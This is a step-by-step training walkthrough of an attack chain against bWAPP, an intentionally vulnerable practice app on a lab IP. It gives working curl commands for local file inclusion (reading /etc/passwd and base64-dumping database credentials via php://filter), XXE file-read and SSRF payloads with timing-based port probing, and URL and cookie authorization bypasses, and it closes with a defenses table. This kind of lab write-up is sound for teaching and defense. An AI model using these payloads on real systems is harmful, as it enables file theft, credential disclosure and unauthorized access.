# Attack Chain Walkthrough — bWAPP Mission 2026-03-19-001
**Target:** bWAPP v2.2 @ 10.10.30.128
**Date:** 2026-03-19
**Purpose:** Training walkthrough — reproducible step-by-step attack chain

---

## Prerequisites

- Authenticated session as `bee / bug` with `security_level=0`
- `curl` available on attacker machine

---

## Step 1: Authenticate and Get Low-Security Session

```bash
curl -c /tmp/session.txt -X POST http://10.10.30.128/login.php \
  -d "login=bee&password=bug&security_level=0&form=submit"
```

**Why:** The `security_level` parameter during login sets a server-side cookie. Setting it to 0 gives the least-filtered session. The cookie `security_level=0` is readable by all pages.

---

## Step 2: LFI — Read /etc/passwd (Verify Open Access)

```bash
curl -b /tmp/session.txt \
  "http://10.10.30.128/rlfi.php?language=/etc/passwd&action=go" | grep "root:\|www-data:"
```

**Expected output:**
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Why it works:** At security_level=0, `$language = $_GET["language"]` with no sanitization. `include($language)` runs on the raw value. No `open_basedir` restriction means the path traversal reaches `/etc/passwd`.

---

## Step 3: LFI — Exfiltrate Database Credentials via php://filter

```bash
curl -b /tmp/session.txt \
  "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=admin/settings.php&action=go" \
  | grep -oP '[A-Za-z0-9+/]{30,}={0,2}' | head -1 | base64 -d
```

**Expected output (excerpt):**
```php
$db_server = "localhost";
$db_username = "root";
$db_password = "";
$db_name = "bWAPP";
```

**Why it works:** `php://filter` is a PHP I/O wrapper that pre-processes a stream before include(). The `convert.base64-encode` filter reads the file's raw bytes and base64-encodes them — returning the source code instead of executing it. Even at security_level=1 (which appends `.php`), the filter wrapper's resource path would need to include `.php` to be affected.

**Key learning:** `php://filter` is one of the most powerful LFI techniques for PHP source disclosure. It works when `allow_url_fopen=On` and there is no open_basedir or wrapper blocking.

---

## Step 4: Read Entire Challenge Map via LFI

```bash
curl -b /tmp/session.txt \
  "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=bugs.txt&action=go" \
  | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | base64 -d | grep -E "XXE|SSRF|LFI|Session"
```

This reveals:
- `Remote & Local File Inclusion (RFI/LFI),rlfi.php`
- `Server Side Request Forgery (SSRF),ssrf.php`
- `XML External Entity Attacks (XXE),xxe-1.php`
- `Session Management - Administrative Portals,smgmt_admin_portal.php`

---

## Step 5: XXE — Inject SYSTEM Entity to Exfiltrate File

```bash
curl -b /tmp/session.txt -X POST http://10.10.30.128/xxe-2.php \
  -H "Content-Type: text/xml; charset=UTF-8" \
  --data-raw '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<reset><login>bee</login><secret>&xxe;</secret></reset>'
```

**Expected response:** `bee's secret has been reset!`

**Why it works:** `xxe-2.php` calls `simplexml_load_string($body)`. libxml2 processes the DOCTYPE declaration and SYSTEM entity. Because `libxml_disable_entity_loader(true)` is commented out in the source, external entities are resolved. The `file:///etc/passwd` content is fetched and substituted as the `&xxe;` entity value, then stored in the DB as bee's secret.

**Key learning:** XXE vulnerabilities in PHP 5.x commonly occur because developers comment out `libxml_disable_entity_loader()` thinking it doesn't work on older versions — when it actually has worked since PHP 5.2.

---

## Step 6: SSRF via XXE — Probe Internal MySQL Port

```bash
curl -b /tmp/session.txt -X POST http://10.10.30.128/xxe-2.php \
  -H "Content-Type: text/xml; charset=UTF-8" \
  --data-raw '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">
]>
<reset><login>bee</login><secret>&xxe;</secret></reset>'
```

**Expected response:** PHP warning about XML parse error (due to MySQL banner being non-XML)

**Why it works:** `allow_url_fopen=On` allows PHP's stream wrappers to make HTTP requests. libxml2 uses PHP's stream layer to resolve SYSTEM entity URLs. The server makes a TCP connection to 127.0.0.1:3306, receives MySQL's greeting banner, and tries to parse it as XML content — confirming the internal connection.

**Port scanning via timing:**
```bash
# Open port response: ~40ms
# Closed port response: ~90ms (TCP RST takes longer to propagate)
time curl [above command with different ports]
```

---

## Step 7: Broken Auth (Low) — URL Parameter Manipulation

```bash
curl -b /tmp/session.txt \
  "http://10.10.30.128/smgmt_admin_portal.php?admin=1"
```

**Expected response:** `Cowabunga... You unlocked this page using an URL manipulation.`

**Why it works:** The page checks `$_GET["admin"] == "1"`. No session validation, no CSRF token, no server-side privilege check. The authorization decision is entirely client-controlled.

---

## Step 8: Broken Auth (Medium) — Cookie Manipulation

```bash
# Get a medium-security session
curl -c /tmp/session_med.txt -X POST http://10.10.30.128/login.php \
  -d "login=bee&password=bug&security_level=1&form=submit"

# Extract PHPSESSID
SESSID=$(grep PHPSESSID /tmp/session_med.txt | awk '{print $7}')

# Access admin portal with forged admin cookie
curl -b "PHPSESSID=$SESSID; security_level=1; admin=1" \
  "http://10.10.30.128/smgmt_admin_portal.php"
```

**Expected response:** `Cowabunga... You unlocked this page using a cookie manipulation.`

**Why it works:** At security_level=1, the page checks `$_COOKIE["admin"] == "1"`. The server sets `admin=0` automatically on first visit, but the cookie has no HttpOnly or Secure flags and no HMAC signature. Simply setting `admin=1` in the cookie header grants admin access.

---

## Attack Chain Summary

```
Attacker
  │
  ├── GET /rlfi.php?language=/etc/passwd          ← LFI: direct file read
  │
  ├── GET /rlfi.php?language=php://filter/...     ← LFI: source code / creds
  │       └── DB creds: root / ""
  │
  ├── POST /xxe-2.php (file:// SYSTEM entity)     ← XXE: file exfil to DB
  │       └── file:///etc/passwd → DB secret
  │
  ├── POST /xxe-2.php (http:// SYSTEM entity)     ← SSRF: internal service probe
  │       └── 127.0.0.1:3306 → MySQL banner returned
  │
  ├── GET /smgmt_admin_portal.php?admin=1          ← Broken Auth: URL bypass
  │       └── Admin page unlocked
  │
  └── GET /smgmt_admin_portal.php + Cookie admin=1 ← Broken Auth: cookie bypass
          └── Admin page unlocked (medium security)
```

---

## Defense Bypass Techniques Summary

| Technique | Bypass | Defense |
|---|---|---|
| LFI extension filter (level 1) | php://filter ignores appended .php | Whitelist allowed files |
| LFI path restriction | No open_basedir = no restriction | Set open_basedir |
| XXE protection (level 1/2) | libxml_disable_entity_loader commented out | Uncomment or use LIBXML_NONET |
| Cookie-based auth | No HMAC = forge admin=1 | Store admin in $_SESSION only |
| URL-based auth | No server validation = forge ?admin=1 | Remove client-controlled auth |
